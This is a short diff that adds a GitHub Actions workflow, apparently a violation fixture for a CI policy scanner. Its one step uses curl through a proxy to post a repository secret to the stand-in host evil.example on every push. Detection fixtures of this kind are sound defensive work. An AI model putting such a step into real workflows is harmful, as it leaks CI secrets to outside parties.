@@ -1,0 +1,8 @@
+name: violation_proxy_then_untrusted
+on: push
+jobs:
+  send:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          curl -x proxy.corp.example:3128 -d "k=${{ secrets.K }}" https://evil.example/x
